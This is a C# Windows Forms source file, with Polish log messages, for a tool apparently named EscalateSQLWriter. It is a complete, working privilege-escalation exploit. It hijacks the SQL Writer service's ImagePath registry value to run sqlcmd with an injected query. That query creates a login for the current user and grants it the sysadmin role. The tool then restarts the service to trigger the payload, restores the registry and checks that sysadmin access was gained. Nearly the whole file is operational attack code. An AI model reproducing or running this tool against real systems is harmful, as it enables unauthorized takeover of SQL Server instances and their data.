using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.ServiceProcess;
using System.Windows.Forms;
using Microsoft.Win32;

namespace EscalateSQLWriter
{
    public partial class MainForm : Form
    {
        private string _sqlWriterRegPath = @"SYSTEM\CurrentControlSet\Services\SQLWriter";
        private string _sqlcmdPath = null;
        private string _originalImagePath = null;
        private string _backupFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SQLWriter_Backup.reg");

        public MainForm()
        {
            InitializeComponent();
            CheckAdmin();
        }

        private void CheckAdmin()
        {
            if (!IsAdministrator())
            {
                Log("UWAGA: Program nie ma uprawnień Administratora.", Color.Red);
                Log("Wiele funkcji nie będzie działać.", Color.Red);
                btnScan.Enabled = false;
            }
            else
            {
                Log("Uprawnienia Administratora: OK", Color.Green);
            }
        }

        private bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void Log(string message, Color? color = null)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.Invoke(new Action(() => Log(message, color)));
                return;
            }

            txtLog.SelectionStart = txtLog.TextLength;
            txtLog.SelectionLength = 0;
            txtLog.SelectionColor = color ?? Color.Lime;
            txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}{Environment.NewLine}");
            txtLog.SelectionColor = txtLog.ForeColor;
            txtLog.ScrollToCaret();
        }

        private void btnScan_Click(object sender, EventArgs e)
        {
            btnScan.Enabled = false;
            cmbServices.Items.Clear();
            cmbServices.Enabled = false;
            btnExploit.Enabled = false;
            _sqlcmdPath = null;
            _originalImagePath = null;

            // Run in background to keep UI responsive
            System.Threading.Tasks.Task.Run(() => PerformScan());
        }

        private void PerformScan()
        {
            try
            {
                Log("Rozpoczynanie skanowania...");

                // 1. Check Registry Key
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath))
                {
                    if (key == null)
                    {
                        Log("BŁĄD: Nie znaleziono klucza SQL Writer!", Color.Red);
                        return;
                    }
                    _originalImagePath = key.GetValue("ImagePath") as string;
                }
                Log($"SQL Writer ImagePath: {_originalImagePath}", Color.White);

                // 2. Backup
                Log("Wykonywanie backupu rejestru...");
                ProcessStartInfo regExport = new ProcessStartInfo("reg.exe", $"export \"HKLM\\{_sqlWriterRegPath}\" \"{_backupFile}\" /y");
                regExport.WindowStyle = ProcessWindowStyle.Hidden;
                regExport.CreateNoWindow = true;
                regExport.UseShellExecute = false;

                var regProc = Process.Start(regExport);
                regProc.WaitForExit();

                if (File.Exists(_backupFile))
                    Log($"Backup zapisano w: {_backupFile}", Color.Green);
                else
                    Log("Ostrzeżenie: Nie udało się utworzyć pliku backupu.", Color.Yellow);

                // 3. Find sqlcmd
                _sqlcmdPath = FindSqlCmd();
                if (string.IsNullOrEmpty(_sqlcmdPath))
                {
                    Log("BŁĄD: Nie znaleziono sqlcmd.exe.", Color.Red);
                    return;
                }
                Log($"Znaleziono sqlcmd: {_sqlcmdPath}", Color.Green);

                // 4. Find Services
                Log("Szukanie usług SQL Server...");
                var sqlServices = ServiceController.GetServices()
                    .Where(s => (s.ServiceName == "MSSQLSERVER" || s.ServiceName.StartsWith("MSSQL$")) && s.Status == ServiceControllerStatus.Running)
                    .ToList();

                if (sqlServices.Count == 0)
                {
                    Log("Nie znaleziono uruchomionych usług SQL Server.", Color.Red);
                    return;
                }

                // Update UI
                this.Invoke(new Action(() =>
                {
                    foreach (var svc in sqlServices)
                    {
                        cmbServices.Items.Add(svc.ServiceName);
                    }
                    if (cmbServices.Items.Count > 0)
                    {
                        cmbServices.SelectedIndex = 0;
                        cmbServices.Enabled = true;
                        btnExploit.Enabled = true;
                    }
                }));

                Log($"Znaleziono {sqlServices.Count} usług.", Color.Green);
                Log("Gotowe do ataku. Wybierz usługę i kliknij przycisk.", Color.Cyan);
            }
            catch (Exception ex)
            {
                Log($"Błąd podczas skanowania: {ex.Message}", Color.Red);
            }
            finally
            {
                this.Invoke(new Action(() => btnScan.Enabled = true));
            }
        }

        private string FindSqlCmd()
        {
            var pathEnv = Environment.GetEnvironmentVariable("PATH");
            if (pathEnv != null)
            {
                var paths = pathEnv.Split(';');
                foreach (var path in paths)
                {
                    string fullPath = Path.Combine(path, "sqlcmd.exe");
                    if (File.Exists(fullPath)) return fullPath;
                }
            }

            string[] searchPaths = {
                @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC",
                @"C:\Program Files\Microsoft SQL Server"
            };

            foreach (var basePath in searchPaths)
            {
                if (Directory.Exists(basePath))
                {
                    try
                    {
                        var files = Directory.GetFiles(basePath, "sqlcmd.exe", SearchOption.AllDirectories);
                        if (files.Length > 0) return files[0];
                    }
                    catch { }
                }
            }
            return null;
        }

        private void btnExploit_Click(object sender, EventArgs e)
        {
            if (cmbServices.SelectedItem == null) return;
            string serviceName = cmbServices.SelectedItem.ToString();

            btnScan.Enabled = false;
            btnExploit.Enabled = false;
            cmbServices.Enabled = false;

            System.Threading.Tasks.Task.Run(() => RunExploit(serviceName));
        }

        private void RunExploit(string serviceName)
        {
            try
            {
                Log("--- Rozpoczynanie procedury ---", Color.Cyan);

                // Prepare Server Name
                string serverInstance = ".";
                if (serviceName != "MSSQLSERVER")
                {
                    string instance = serviceName.Substring(6); // Remove MSSQL$
                    serverInstance = $".\\{instance}";
                }
                Log($"Cel: {serverInstance}");

                // Current User
                string currentUser = WindowsIdentity.GetCurrent().Name;
                Log($"Użytkownik: {currentUser}");

                // Payload
                string sqlQuery = $"IF NOT EXISTS (SELECT name FROM sys.sql_logins WHERE name = N'{currentUser}') BEGIN CREATE LOGIN [{currentUser}] FROM WINDOWS; END; ALTER SERVER ROLE [sysadmin] ADD MEMBER [{currentUser}];";
                string escapedQuery = sqlQuery.Replace("\"", "\"\"");
                string payload = $"\"{_sqlcmdPath}\" -S {serverInstance} -Q \"{escapedQuery}\"";

                Log("Modyfikacja rejestru SQL Writer...", Color.Yellow);
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                {
                    key.SetValue("ImagePath", payload, RegistryValueKind.ExpandString);
                }

                // Trigger
                Log("Zatrzymywanie usługi SQL Writer...", Color.Yellow);
                ServiceController sc = new ServiceController("SQLWriter");
                if (sc.Status != ServiceControllerStatus.Stopped)
                {
                    sc.Stop();
                    sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(30));
                }

                Log("Uruchamianie exploita (Start Service)...", Color.Yellow);
                try
                {
                    sc.Start();
                    sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(10));
                }
                catch
                {
                    Log("Usługa zgłosiła błąd (oczekiwane - payload wykonany).", Color.Green);
                }

                // Restore
                Log("Przywracanie rejestru...", Color.Cyan);
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                {
                    key.SetValue("ImagePath", _originalImagePath, RegistryValueKind.ExpandString);
                }

                // Fix Service State
                Log("Przywracanie usługi SQL Writer do stanu normalnego...", Color.Cyan);
                sc.Refresh();
                try
                {
                     if (sc.Status != ServiceControllerStatus.Stopped)
                     {
                         sc.Stop();
                         sc.WaitForStatus(ServiceControllerStatus.Stopped);
                     }
                     sc.Start();
                     Log("Usługa SQL Writer działa.", Color.Green);
                }
                catch (Exception ex)
                {
                    Log($"Problem z uruchomieniem usługi: {ex.Message}", Color.Yellow);
                }

                // Verify
                Log("Weryfikacja dostępu...", Color.Cyan);
                string testQuery = "SELECT 'SUKCES: ' + SYSTEM_USER + ' ma sysadmin na ' + @@SERVERNAME";
                ProcessStartInfo testInfo = new ProcessStartInfo(_sqlcmdPath, $"-S {serverInstance} -E -Q \"{testQuery}\"");
                testInfo.UseShellExecute = false;
                testInfo.RedirectStandardOutput = true;
                testInfo.CreateNoWindow = true;

                var proc = Process.Start(testInfo);
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();

                if (proc.ExitCode == 0 && output.Contains("SUKCES"))
                {
                    Log("WERYFIKACJA POMYŚLNA!", Color.Green);
                    Log(output.Trim(), Color.Green);
                }
                else
                {
                    Log("Weryfikacja nieudana lub brak outputu.", Color.Red);
                    Log($"Output: {output}", Color.White);
                }

            }
            catch (Exception ex)
            {
                Log($"Błąd krytyczny: {ex.Message}", Color.Red);
                // Attempt restore just in case
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                    {
                        key.SetValue("ImagePath", _originalImagePath, RegistryValueKind.ExpandString);
                    }
                    Log("Próbowano przywrócić rejestr po błędzie.", Color.Orange);
                }
                catch { }
            }
            finally
            {
                this.Invoke(new Action(() =>
                {
                    btnScan.Enabled = true;
                    btnExploit.Enabled = true;
                    cmbServices.Enabled = true;
                }));
            }
        }
    }
}
